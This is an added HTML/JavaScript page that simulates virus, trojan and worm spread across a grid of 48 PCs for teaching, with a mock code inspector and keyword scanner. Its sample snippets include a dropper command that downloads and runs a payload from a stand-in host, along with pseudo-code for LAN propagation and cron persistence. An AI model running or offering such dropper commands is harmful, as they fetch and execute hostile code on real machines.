@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>CyberDefense Matrix - Malware Simulation (virus/trojan/worm)</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Orbitron', monospace;
+            background:#000;
+            color:#00ff00;
+            min-height:100vh;
+            padding:20px;
+            overflow-x:hidden;
+            position:relative;
+        }
+
+        body::before {
+            content:'';
+            position:fixed; top:0; left:0; width:100%; height:100%;
+            background:
+                linear-gradient(0deg, transparent 24%, rgba(0,255,0,0.05) 25%, rgba(0,255,0,0.05) 26%, transparent 27%, transparent 74%, rgba(0,255,0,0.05) 75%, rgba(0,255,0,0.05) 76%, transparent 77%, transparent),
+                linear-gradient(90deg, transparent 24%, rgba(0,255,0,0.05) 25%, rgba(0,255,0,0.05) 26%, transparent 27%, transparent 74%, rgba(0,255,0,0.05) 75%, rgba(0,255,0,0.05) 76%, transparent 77%, transparent);
+            background-size:50px 50px; z-index:-1; animation:gridMove 20s linear infinite;
+        }
+        @keyframes gridMove { 0%{background-position:0 0} 100%{background-position:50px 50px} }
+
+        .container { max-width:1600px; margin:0 auto; }
+
+        .header {
+            text-align:center; margin-bottom:30px; padding:25px;
+            background:rgba(0,0,0,0.8); border:3px solid #00ff00; border-radius:0;
+            box-shadow: 0 0 20px #00ff00, inset 0 0 20px rgba(0,255,0,0.2);
+            position:relative; animation:borderPulse 2s infinite;
+        }
+        @keyframes borderPulse {
+            0%,100%{ box-shadow:0 0 20px #00ff00, inset 0 0 20px rgba(0,255,0,0.2); }
+            50%{ box-shadow:0 0 40px #00ff00, inset 0 0 30px rgba(0,255,0,0.3); }
+        }
+        .header h1 { font-size:3rem; text-shadow:0 0 10px #00ff00; letter-spacing:5px; font-weight:900; animation:textGlow 1.5s ease-in-out infinite;}
+        @keyframes textGlow { 0%,100%{text-shadow:0 0 10px #00ff00} 50%{ text-shadow:0 0 20px #00ff00, 0 0 30px #00ff00; } }
+
+        .alert-banner { display:inline-block; background:#000; border:2px solid #ff00ff; padding:10px 30px; font-size:1rem; box-shadow:0 0 20px #ff00ff; animation:alertBlink 1s infinite; }
+        @keyframes alertBlink { 0%,49%,100%{opacity:1} 50%,99%{opacity:0.5} }
+
+        .main-layout { display:grid; grid-template-columns:440px 1fr; gap:30px; }
+
+        .card {
+            background:rgba(0,0,0,0.9); border:2px solid #00ff00; padding:20px; margin-bottom:25px;
+            box-shadow: 0 0 15px rgba(0,255,0,0.5), inset 0 0 15px rgba(0,255,0,0.1);
+            position:relative;
+        }
+        .card h2 { font-size:1.5rem; margin-bottom:20px; color:#00ffff; text-shadow:0 0 10px #00ffff; text-transform:uppercase; letter-spacing:3px; border-bottom:2px solid #00ff00; padding-bottom:10px;}
+
+        .threat-grid { display:grid; gap:15px; }
+        .threat-card { padding:20px; background:rgba(0,20,0,0.8); border:2px solid #004400; cursor:pointer; transition:all 0.3s; position:relative; overflow:hidden; }
+        .threat-card:hover { transform:translateY(-5px); box-shadow:0 5px 25px rgba(0,255,0,0.5); }
+        .threat-card.active { border:2px solid #00ff00; animation:activeGlow 1s infinite; }
+        @keyframes activeGlow { 0%,100%{ box-shadow:0 0 20px rgba(0,255,0,0.8)} 50%{ box-shadow:0 0 40px rgba(0,255,0,1)} }
+
+        .threat-card.virus.active { background:rgba(200,0,0,0.08); border-color:#ff3333; }
+        .threat-card.trojan.active { background:rgba(255,165,0,0.06); border-color:#ff8800; }
+        .threat-card.worm.active { background:rgba(0,128,255,0.04); border-color:#00aaff; }
+
+        .threat-header { display:flex; align-items:center; gap:15px; margin-bottom:10px; font-size:1.15rem; font-weight:bold; }
+        .threat-icon { font-size:1.8rem; animation:iconFloat 2s ease-in-out infinite; }
+        @keyframes iconFloat { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-5px)} }
+
+        .control-buttons { display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:20px; }
+        .cyber-btn { padding:15px; border:2px solid; background:#000; color:#00ff00; font-family:'Orbitron'; font-size:1.1rem; font-weight:bold; cursor:pointer; text-transform:uppercase; letter-spacing:2px; position:relative; overflow:hidden; transition:all 0.3s; }
+        .cyber-btn::before { content:''; position:absolute; top:50%; left:50%; width:0; height:0; background:rgba(0,255,0,0.15); transform:translate(-50%,-50%); transition:width 0.3s, height 0.3s; }
+        .cyber-btn:hover::before { width:100%; height:100%; }
+        .btn-start { border-color:#00ff00; box-shadow:0 0 15px #00ff00; grid-column:1 / -1; }
+        .btn-reset { border-color:#ff0000; box-shadow:0 0 15px #ff0000; color:#ff0000; }
+
+        .slider-container { margin-bottom:20px; }
+        .slider-header { display:flex; justify-content:space-between; margin-bottom:10px; color:#00ffff; text-shadow:0 0 5px #00ffff; }
+        .cyber-slider { width:100%; height:8px; background:#001100; outline:none; border:1px solid #00ff00; -webkit-appearance:none; }
+        .cyber-slider::-webkit-slider-thumb { -webkit-appearance:none; width:25px; height:25px; background:#00ff00; cursor:pointer; box-shadow:0 0 15px #00ff00; clip-path:polygon(50% 0%,100% 50%,50% 100%,0% 50%); }
+
+        .stats-container { display:grid; gap:15px; }
+        .stat-box { display:flex; justify-content:space-between; padding:15px; background:rgba(0,20,0,0.6); border-left:4px solid; position:relative; overflow:hidden; }
+        .stat-box.total { border-color:#00ffff; }
+        .stat-box.compromised { border-color:#ff0000; }
+        .stat-box.secure { border-color:#00ff00; }
+
+        .progress-wrapper { margin-top:20px; background:#001100; height:25px; border:2px solid #00ff00; position:relative; overflow:hidden; }
+        .progress-fill { height:100%; background:linear-gradient(90deg,#ff0000,#ff4444); transition:width 0.5s ease; position:relative; box-shadow:0 0 20px #ff0000; }
+
+        .diamond-grid { display:grid; grid-template-columns:repeat(8,1fr); gap:10px; margin-top:25px; }
+        .diamond-node { width:70px; height:70px; position:relative; margin:15px auto; cursor:pointer; }
+        .diamond-shape { width:100%; height:100%; background:#001100; border:3px solid #00ff00; transform:rotate(45deg); transition:all 0.4s; position:relative; box-shadow:0 0 15px rgba(0,255,0,0.5); }
+        .diamond-content { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%) rotate(-45deg); text-align:center; width:100%; z-index:2; }
+        .node-id { font-size:0.7rem; font-weight:bold; margin-bottom:3px; }
+        .node-state { font-size:0.6rem; }
+
+        .diamond-node.secure .diamond-shape { background:linear-gradient(135deg,#003300,#006600); border-color:#00ff00; animation:secureRotate 4s linear infinite; }
+        @keyframes secureRotate { from{transform:rotate(45deg)} to{transform:rotate(405deg)} }
+
+        .diamond-node.infected { animation:infectedPulse 1s infinite, diamondSpin 2s linear infinite; border-width:4px; }
+        .diamond-node.infected.virus .diamond-shape { background:linear-gradient(135deg,#330000,#660000); border-color:#ff0000; box-shadow:0 0 25px rgba(255,0,0,0.8); }
+        .diamond-node.infected.trojan .diamond-shape { background:linear-gradient(135deg,#664400,#aa6600); border-color:#ff8800; box-shadow:0 0 25px rgba(255,136,0,0.7); }
+        .diamond-node.infected.worm .diamond-shape { background:linear-gradient(135deg,#003366,#0066cc); border-color:#00aaff; box-shadow:0 0 25px rgba(0,170,255,0.7); }
+
+        .diamond-node.infected.virus .node-id, .diamond-node.infected.virus .node-state { color:#ff6666; text-shadow:0 0 8px #ff6666; }
+        .diamond-node.infected.trojan .node-id, .diamond-node.infected.trojan .node-state { color:#ffb366; text-shadow:0 0 8px #ffb366; }
+        .diamond-node.infected.worm .node-id, .diamond-node.infected.worm .node-state { color:#66ccff; text-shadow:0 0 8px #66ccff; }
+
+        @keyframes infectedPulse { 0%,100%{ transform:rotate(45deg) scale(1); opacity:1 } 50%{ transform:rotate(45deg) scale(1.12); opacity:0.85 } }
+        @keyframes diamondSpin { from{transform:rotate(45deg)} to{transform:rotate(405deg)} }
+
+        .terminal { background:#000; border:2px solid #00ff00; padding:20px; height:300px; overflow-y:auto; font-family:'Courier New',monospace; font-size:0.85rem; margin-top:25px; box-shadow:0 0 20px rgba(0,255,0,0.3), inset 0 0 20px rgba(0,255,0,0.1); }
+        .terminal-line { margin-bottom:10px; display:flex; gap:10px; animation:terminalFadeIn 0.3s; }
+        .terminal-time { color:#666; flex-shrink:0; }
+        .terminal-line.info { color:#00ff00; }
+        .terminal-line.warning { color:#ffff00; text-shadow:0 0 5px #ffff00; }
+        .terminal-line.danger { color:#ff0000; font-weight:bold; text-shadow:0 0 5px #ff0000; animation:terminalFadeIn 0.3s, dangerFlash 0.5s; }
+        .terminal-empty { color:#444; text-align:center; padding:50px; font-style:italic; }
+        @keyframes terminalFadeIn { from{opacity:0; transform:translateX(-10px)} to{opacity:1; transform:translateX(0)} }
+        @keyframes dangerFlash { 0%,100%{opacity:1} 50%{opacity:0.5} }
+
+        /* PC Inspector */
+        .pc-inspector pre { background:#050505; color:#e6ffe6; padding:12px; border-radius:6px; border:1px solid #003300; max-height:160px; overflow:auto; font-size:0.8rem; }
+        .pc-inspector .pc-field { margin-bottom:8px; font-size:0.9rem; color:#99ff99; }
+        .pc-inspector .pc-actions { display:flex; gap:8px; margin-top:10px; }
+
+        @media (max-width:1200px) {
+            .main-layout { grid-template-columns:1fr; }
+            .diamond-grid { grid-template-columns:repeat(6,1fr); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⬡ CYBERDEFENSE MATRIX ⬡</h1>
+            <p>◈ ADVANCED THREAT SIMULATION PROTOCOL ◈</p>
+            <div class="alert-banner">⚡ SAFE MODE ACTIVE - EDUCATIONAL SIMULATION ⚡</div>
+        </div>
+
+        <div class="main-layout">
+            <div>
+                <div class="card">
+                    <h2>▸ THREAT SELECTION (CHANGED)</h2>
+                    <div class="threat-grid">
+                        <div class="threat-card virus active" id="threat-virus" onclick="selectThreat('virus')">
+                            <div class="threat-header"><span class="threat-icon">🦠</span><span>VIRUS</span></div>
+                            <div class="threat-desc">Replicates and attaches to files; may corrupt or delete data.</div>
+                        </div>
+                        <div class="threat-card trojan" id="threat-trojan" onclick="selectThreat('trojan')">
+                            <div class="threat-header"><span class="threat-icon">🐴</span><span>TROJAN</span></div>
+                            <div class="threat-desc">Disguised as legitimate software; opens backdoors and remote access.</div>
+                        </div>
+                        <div class="threat-card worm" id="threat-worm" onclick="selectThreat('worm')">
+                            <div class="threat-header"><span class="threat-icon">🐛</span><span>WORM</span></div>
+                            <div class="threat-desc">Self-propagates across networks without user action.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2>▸ COMMAND CENTER</h2>
+                    <div class="control-buttons">
+                        <button class="cyber-btn btn-start" id="mainBtn" onclick="toggleSystem()"><span id="btnLabel">▶ INITIATE</span></button>
+                        <button class="cyber-btn btn-reset" onclick="systemReset()">◀ RESET</button>
+                    </div>
+                    <div class="slider-container">
+                        <div class="slider-header"><span>⚡ SIMULATION VELOCITY</span><span id="velocityDisplay">2.0X</span></div>
+                        <input type="range" class="cyber-slider" id="velocitySlider" min="100" max="1000" step="100" value="500" oninput="adjustVelocity()">
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2>▸ SYSTEM STATUS</h2>
+                    <div class="stats-container">
+                        <div class="stat-box total"><span class="stat-label">TOTAL SYSTEMS</span><span class="stat-value" id="totalStat">48</span></div>
+                        <div class="stat-box compromised"><span class="stat-label">COMPROMISED</span><span class="stat-value" id="compromisedStat">0</span></div>
+                        <div class="stat-box secure"><span class="stat-label">SECURE</span><span class="stat-value" id="secureStat">48</span></div>
+                    </div>
+                    <div class="progress-wrapper"><div class="progress-fill" id="threatProgress" style="width:0%"></div></div>
+                </div>
+
+                <!-- PC Inspector card -->
+                <div class="card pc-inspector" id="pcInspectorCard" style="display:none;">
+                    <h2>▸ PC INSPECTOR</h2>
+                    <div class="pc-field"><strong>Selected:</strong> <span id="pcLabel">—</span></div>
+                    <div class="pc-field"><strong>Status:</strong> <span id="pcStatus">—</span></div>
+                    <div class="pc-field"><strong>Detected Threat Type:</strong> <span id="pcThreat">—</span></div>
+                    <div><strong>Sample Code (simulated)</strong></div>
+                    <pre id="pcCode">// Click a node to view simulated code for that PC. Use "Run Check" to scan.</pre>
+                    <div class="pc-actions">
+                        <button class="cyber-btn" id="runCheckBtn" onclick="runCodeCheck()">Run Check</button>
+                        <button class="cyber-btn" onclick="closeInspector()">Close</button>
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <div class="card">
+                    <h2><span id="threatIndicator">🦠</span> NETWORK TOPOLOGY</h2>
+                    <div class="diamond-grid" id="networkMap"></div>
+                </div>
+
+                <div class="card">
+                    <h2>▸ SECURITY LOG TERMINAL</h2>
+                    <div class="terminal" id="logTerminal"><div class="terminal-empty">&gt; System initialized. Awaiting command...</div></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ----- Config -----
+        var TOTAL_SYSTEMS = 48;
+        var systems = [];
+        var isActive = false;
+        var threatType = 'virus'; // default
+        var velocity = 500;
+        var intervalTimer = null;
+
+        var threatData = {
+            virus: { icon: '🦠', style: 'virus' },
+            trojan: { icon: '🐴', style: 'trojan' },
+            worm: { icon: '🐛', style: 'worm' }
+        };
+
+        // Example simulated code snippets per PC (for inspector)
+        function generateSimulatedCodeFor(id) {
+            // vary a bit for each machine for realism
+            var seed = (id % 3);
+            if (seed === 0) {
+                return `// backup_script.js\n// suspicious file modification\nconst fs = require('fs');\nfs.readdir('/user/docs', (err, files)=>{\n  // replicating change\n});\n// Note: unusual hex pattern: 0xDEADBEEF\n`;
+            } else if (seed === 1) {
+                return `# installer.sh\n# trojan-like dropper\nwget http://malicious.example/payload -O /tmp/payload\nchmod +x /tmp/payload\n/tmp/payload --install\n`;
+            } else {
+                return `// autorun.conf\n// worm-like propagation\nopenSocket('192.168.1.255', 445);\npropagateToLAN();\n// suspicious persistent cron job created\n`;
+            }
+        }
+
+        // ----- Initialize Systems -----
+        function initializeSystems() {
+            systems = [];
+            for (var i = 0; i < TOTAL_SYSTEMS; i++) {
+                systems.push({
+                    id: i,
+                    status: 'secure', // 'secure' | 'infected'
+                    label: 'PC-' + (i < 9 ? '0' : '') + (i + 1),
+                    infectedBy: null
+                });
+            }
+
+            // seed a few infections for demo
+            systems[2].status = 'infected'; systems[2].infectedBy = 'virus';
+            systems[11].status = 'infected'; systems[11].infectedBy = 'trojan';
+            systems[20].status = 'infected'; systems[20].infectedBy = 'worm';
+
+            renderTopology();
+            updateMetrics();
+            clearTerminal();
+            logTerminal('Simulation ready. Select a threat type and initiate.', 'info');
+        }
+
+        // ----- Render Topology -----
+        function renderTopology() {
+            var map = document.getElementById('networkMap');
+            map.innerHTML = '';
+            for (var i = 0; i < systems.length; i++) {
+                var sys = systems[i];
+                var node = document.createElement('div');
+                // classes include secure/infected and infected type if applicable
+                var classes = 'diamond-node ' + (sys.status === 'infected' ? 'infected ' + (sys.infectedBy || '') : 'secure');
+                node.className = classes;
+                node.dataset.index = i;
+
+                var shape = document.createElement('div');
+                shape.className = 'diamond-shape';
+                var content = document.createElement('div');
+                content.className = 'diamond-content';
+                var id = document.createElement('div');
+                id.className = 'node-id'; id.textContent = sys.label;
+                var state = document.createElement('div');
+                state.className = 'node-state'; state.textContent = (sys.status === 'infected' ? '⚠ BREACH' : '✓ OK');
+
+                content.appendChild(id); content.appendChild(state); shape.appendChild(content); node.appendChild(shape);
+                // click opens inspector
+                (function(index){
+                    node.addEventListener('click', function(){ selectNode(index); });
+                })(i);
+
+                map.appendChild(node);
+            }
+        }
+
+        // ----- Metrics -----
+        function updateMetrics() {
+            var compromised = 0, secure = 0;
+            for (var i=0;i<systems.length;i++){
+                if (systems[i].status === 'infected') compromised++; else secure++;
+            }
+            document.getElementById('totalStat').textContent = TOTAL_SYSTEMS;
+            document.getElementById('compromisedStat').textContent = compromised;
+            document.getElementById('secureStat').textContent = secure;
+            var percent = (compromised / TOTAL_SYSTEMS) * 100;
+            document.getElementById('threatProgress').style.width = percent + '%';
+        }
+
+        // ----- Terminal logging -----
+        function logTerminal(text, type) {
+            type = type || 'info';
+            var terminal = document.getElementById('logTerminal');
+            if (terminal.querySelector('.terminal-empty')) terminal.innerHTML = '';
+            var time = new Date().toLocaleTimeString();
+            var line = document.createElement('div'); line.className = 'terminal-line ' + (type==='danger'?'danger':type);
+            var timestamp = document.createElement('span'); timestamp.className = 'terminal-time'; timestamp.textContent = '['+time+']';
+            var msg = document.createElement('span'); msg.textContent = '> ' + text;
+            line.appendChild(timestamp); line.appendChild(msg); terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        function clearTerminal(){ document.getElementById('logTerminal').innerHTML = '<div class="terminal-empty">&gt; System initialized. Awaiting command...</div>'; }
+
+        // ----- Threat selection -----
+        function selectThreat(t) {
+            threatType = t;
+            // update UI active cards + indicator icon
+            ['virus','trojan','worm'].forEach(function(k){
+                var el = document.getElementById('threat-' + k);
+                if (el) el.classList.toggle('active', k === t);
+            });
+            document.getElementById('threatIndicator').textContent = (threatData[t] && threatData[t].icon) || '⚠';
+            logTerminal('Threat selected: ' + t.toUpperCase(), 'info');
+            // also highlight infected nodes visually by re-rendering
+            renderTopology();
+        }
+
+        // ----- Start / Stop simulation -----
+        function toggleSystem() {
+            isActive = !isActive;
+            var btnLabel = document.getElementById('btnLabel');
+            if (isActive) {
+                btnLabel.textContent = '⏸ PAUSE';
+                logTerminal('Simulation started. Propagation active.', 'info');
+                intervalTimer = setInterval(simulateStep, Math.max(100, 1000 - velocity));
+            } else {
+                btnLabel.textContent = '▶ INITIATE';
+                logTerminal('Simulation paused.', 'info');
+                clearInterval(intervalTimer);
+            }
+        }
+
+        function systemReset() {
+            clearInterval(intervalTimer);
+            isActive = false;
+            document.getElementById('btnLabel').textContent = '▶ INITIATE';
+            initializeSystems();
+            document.getElementById('pcInspectorCard').style.display = 'none';
+            logTerminal('System reset to baseline.', 'info');
+        }
+
+        function adjustVelocity(){
+            velocity = parseInt(document.getElementById('velocitySlider').value, 10);
+            var factor = (1000 - velocity) / 500 + 1;
+            document.getElementById('velocityDisplay').textContent = ( (1000 - velocity) / 250 + 1 ).toFixed(1) + 'X';
+            if (isActive) {
+                clearInterval(intervalTimer);
+                intervalTimer = setInterval(simulateStep, Math.max(100, 1000 - velocity));
+            }
+        }
+
+        // ----- Simulation step (simple propagation model) -----
+        function simulateStep(){
+            // simple model: infected nodes try to infect neighbors (adjacent index)
+            var newlyInfected = [];
+            for (var i=0;i<systems.length;i++){
+                var s = systems[i];
+                if (s.status === 'infected') {
+                    // try left and right
+                    [i-1, i+1].forEach(function(n){
+                        if (n >= 0 && n < systems.length && systems[n].status === 'secure') {
+                            // probability depends on threat type
+                            var baseProb = threatType === 'virus' ? 0.06 : (threatType === 'trojan' ? 0.03 : 0.09);
+                            if (Math.random() < baseProb) {
+                                newlyInfected.push(n);
+                            }
+                        }
+                    });
+                }
+            }
+            // apply infections
+            newlyInfected.forEach(function(idx){
+                systems[idx].status = 'infected';
+                systems[idx].infectedBy = threatType;
+                logTerminal(systems[idx].label + ' infected by ' + threatType.toUpperCase() + '.', 'warning');
+            });
+            if (newlyInfected.length === 0) {
+                // small chance of random new infection (user environment)
+                if (Math.random() < 0.01) {
+                    var r = Math.floor(Math.random() * systems.length);
+                    systems[r].status = 'infected';
+                    systems[r].infectedBy = threatType;
+                    logTerminal('Random infection: ' + systems[r].label + ' infected by ' + threatType.toUpperCase() + '.', 'warning');
+                }
+            }
+            renderTopology();
+            updateMetrics();
+        }
+
+        // ----- Node selection & PC inspector -----
+        var selectedNodeIndex = null;
+        function selectNode(index) {
+            selectedNodeIndex = index;
+            var sys = systems[index];
+            document.getElementById('pcInspectorCard').style.display = 'block';
+            document.getElementById('pcLabel').textContent = sys.label;
+            document.getElementById('pcStatus').textContent = sys.status.toUpperCase();
+            document.getElementById('pcThreat').textContent = (sys.infectedBy ? sys.infectedBy.toUpperCase() : 'NONE');
+            document.getElementById('pcCode').textContent = generateSimulatedCodeFor(index);
+            // highlight node visually (add subtle glow)
+            highlightNode(index);
+            logTerminal('Inspector opened for ' + sys.label + '.', 'info');
+        }
+
+        function closeInspector(){
+            document.getElementById('pcInspectorCard').style.display = 'none';
+            clearNodeHighlights();
+            selectedNodeIndex = null;
+            logTerminal('Inspector closed.', 'info');
+        }
+
+        function highlightNode(index) {
+            clearNodeHighlights();
+            var nodes = document.querySelectorAll('.diamond-node');
+            if (nodes[index]) {
+                nodes[index].style.transform = 'scale(1.08)';
+                nodes[index].style.zIndex = 5;
+            }
+        }
+        function clearNodeHighlights() {
+            var nodes = document.querySelectorAll('.diamond-node');
+            nodes.forEach(function(n){ n.style.transform = ''; n.style.zIndex = ''; });
+        }
+
+        // ----- Run code check (simulated static analysis) -----
+        function runCodeCheck() {
+            if (selectedNodeIndex === null) {
+                logTerminal('No PC selected. Click a node to inspect.', 'info'); return;
+            }
+            var sys = systems[selectedNodeIndex];
+            logTerminal('Running static code check on ' + sys.label + '...', 'info');
+
+            // simple heuristics based on simulated code strings
+            var code = document.getElementById('pcCode').textContent;
+            setTimeout(function(){
+                var findings = [];
+                if (code.includes('wget') || code.includes('payload')) findings.push('Suspicious downloader found');
+                if (code.includes('propagateToLAN') || code.includes('openSocket')) findings.push('Network propagation routine detected');
+                if (code.includes('cron') || code.includes('install')) findings.push('Persistence mechanism detected');
+                if (findings.length === 0) {
+                    logTerminal('No immediate malicious patterns detected in static scan for ' + sys.label + '.', 'info');
+                } else {
+                    logTerminal('Scan results for ' + sys.label + ': ' + findings.join('; '), 'danger');
+                    // mark infected visually if not already
+                    if (sys.status !== 'infected') {
+                        sys.status = 'infected'; sys.infectedBy = threatType; renderTopology(); updateMetrics();
+                        logTerminal(sys.label + ' marked as COMPROMISED by scanner (simulated).', 'warning');
+                    }
+                }
+            }, 800);
+        }
+
+        // ----- On load -----
+        window.addEventListener('load', function(){
+            initializeSystems();
+            // attach initial threat selection to ensure UI matches variable
+            selectThreat(threatType);
+        });
+
+        // ----- accessibility helpers (keyboard) -----
+        window.addEventListener('keydown', function(e){
+            if (e.key === 'r') systemReset();
+            if (e.key === ' ') { e.preventDefault(); toggleSystem(); }
+        });
+
+    </script>
+</body>
+</html>
